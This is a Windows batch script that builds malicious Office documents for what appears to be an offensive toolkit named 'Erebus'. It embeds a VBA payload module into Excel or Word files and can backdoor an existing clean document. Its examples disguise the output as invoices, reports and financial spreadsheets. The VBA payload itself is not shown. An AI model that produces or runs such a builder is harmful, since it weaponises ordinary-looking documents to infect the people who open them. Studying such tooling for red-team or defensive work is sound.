@echo off
setlocal EnableDelayedExpansion

:: build_maldoc.bat — Erebus maldoc builder for operator Windows host
::
:: Usage (run from the payload directory where erebus_payload.bas was dropped):
::   build_maldoc.bat [--format <fmt>] [--bas <file>] [--output <file>] [OPTIONS]
::
:: Supported formats:  xlsm  xlsx  xlam  docm  doc
:: Defaults:           --format xlsm  --bas erebus_payload.bas  --output erebus_payload.<fmt>
::
:: Options:
::   --format  <fmt>     Output format: xlsm | xlsx | xlam | docm | doc
::   --bas     <file>    Path to .bas VBA module file  (default: erebus_payload.bas)
::   --output  <file>    Destination output path        (default: erebus_payload.<fmt>)
::   --source  <file>    Existing Office document to backdoor (optional)
::   --template <file>   Template .xlsm/.docm to use for new document (optional)
::   --module  <name>    VBA module name inside the document (default: ErebusPayload)
::   --no-com            Disable COM and use ZIP-based fallback (Excel formats only)
::   --help              Show this help and exit

:: ── Defaults ─────────────────────────────────────────────────────────────────
set FMT=xlsm
set BAS=erebus_payload.bas
set OUTPUT=
set SOURCE=
set TEMPLATE=
set MODULE=ErebusPayload
set NOCOM=
set HELPER_DIR=%~dp0

:: ── Parse arguments ──────────────────────────────────────────────────────────
:parse_args
if "%~1"=="" goto :check_args
if /i "%~1"=="--format"   ( set FMT=%~2    & shift & shift & goto :parse_args )
if /i "%~1"=="--bas"      ( set BAS=%~2    & shift & shift & goto :parse_args )
if /i "%~1"=="--output"   ( set OUTPUT=%~2 & shift & shift & goto :parse_args )
if /i "%~1"=="--source"   ( set SOURCE=%~2 & shift & shift & goto :parse_args )
if /i "%~1"=="--template" ( set TEMPLATE=%~2 & shift & shift & goto :parse_args )
if /i "%~1"=="--module"   ( set MODULE=%~2 & shift & shift & goto :parse_args )
if /i "%~1"=="--no-com"   ( set NOCOM=--no-com & shift & goto :parse_args )
if /i "%~1"=="--help"     ( goto :show_help )
echo [WARN] Unknown argument: %~1
shift
goto :parse_args

:check_args
:: Set default output path from format
if "%OUTPUT%"=="" set OUTPUT=erebus_payload.%FMT%

:: Validate format
set VALID=0
for %%F in (xlsm xlsx xlam docm doc) do (
    if /i "%FMT%"=="%%F" set VALID=1
)
if "%VALID%"=="0" (
    echo [ERROR] Unsupported format: %FMT%
    echo         Supported: xlsm xlsx xlam docm doc
    exit /b 1
)

:: Validate .bas file exists
if not exist "%BAS%" (
    echo [ERROR] VBA file not found: %BAS%
    echo         Run from the payload directory or pass --bas path\to\file.bas
    exit /b 1
)

:: ── Locate Python ─────────────────────────────────────────────────────────────
set PYTHON=
for %%P in (python3.exe python.exe py.exe) do (
    if "!PYTHON!"=="" (
        where %%P >nul 2>&1
        if not errorlevel 1 set PYTHON=%%P
    )
)
if "!PYTHON!"=="" (
    echo [ERROR] Python not found in PATH.  Install Python 3 and retry.
    exit /b 1
)

:: ── Build optional argument string ───────────────────────────────────────────
set EXTRA=
if not "%SOURCE%"==""   set EXTRA=!EXTRA! --source-excel "%SOURCE%"
if not "%TEMPLATE%"=="" set EXTRA=!EXTRA! --template "%TEMPLATE%"
if not "%NOCOM%"==""    set EXTRA=!EXTRA! %NOCOM%

:: Word commands use --source-word instead of --source-excel
if /i "%FMT%"=="docm" (
    set EXTRA=
    if not "%SOURCE%"==""   set EXTRA=!EXTRA! --source-word "%SOURCE%"
    if not "%TEMPLATE%"=="" set EXTRA=!EXTRA! --word-template "%TEMPLATE%"
)
if /i "%FMT%"=="doc" (
    set EXTRA=
    if not "%SOURCE%"==""   set EXTRA=!EXTRA! --source-word "%SOURCE%"
    if not "%TEMPLATE%"=="" set EXTRA=!EXTRA! --word-template "%TEMPLATE%"
)

:: ── Run helper ────────────────────────────────────────────────────────────────
echo [*] Building %FMT% maldoc...
echo [*] VBA source : %BAS%
echo [*] Output     : %OUTPUT%
echo [*] Module name: %MODULE%

!PYTHON! "%HELPER_DIR%main.py" %FMT% ^
    --bas-file "%BAS%" ^
    --output "%OUTPUT%" ^
    --module-name "%MODULE%" ^
    !EXTRA!

if errorlevel 1 (
    echo [FAIL] Maldoc build failed.
    echo        Ensure Microsoft Office is installed and VBA project access is trusted:
    echo          Excel: File > Options > Trust Center > Macro Settings > Trust access to VBA project object model
    echo          Word:  File > Options > Trust Center > Macro Settings > Trust access to VBA project object model
    exit /b 1
)

echo [OK] Output: %OUTPUT%
exit /b 0

:show_help
echo.
echo build_maldoc.bat -- Erebus maldoc builder
echo.
echo Usage: build_maldoc.bat [OPTIONS]
echo.
echo  --format  ^<fmt^>    xlsm ^| xlsx ^| xlam ^| docm ^| doc  (default: xlsm)
echo  --bas     ^<file^>   .bas VBA module file             (default: erebus_payload.bas)
echo  --output  ^<file^>   Output file path                 (default: erebus_payload.^<fmt^>)
echo  --source  ^<file^>   Existing document to backdoor    (optional)
echo  --template ^<file^>  Template .xlsm/.docm to clone    (optional)
echo  --module  ^<name^>   VBA module name                  (default: ErebusPayload)
echo  --no-com           ZIP fallback (Excel only, no Word COM required)
echo  --help             Show this help
echo.
echo Examples:
echo   build_maldoc.bat
echo   build_maldoc.bat --format docm --output invoice.docm
echo   build_maldoc.bat --format doc  --output report.doc --source clean_report.doc
echo   build_maldoc.bat --format xlsm --bas payload.bas --output financial.xlsm
echo.
exit /b 0
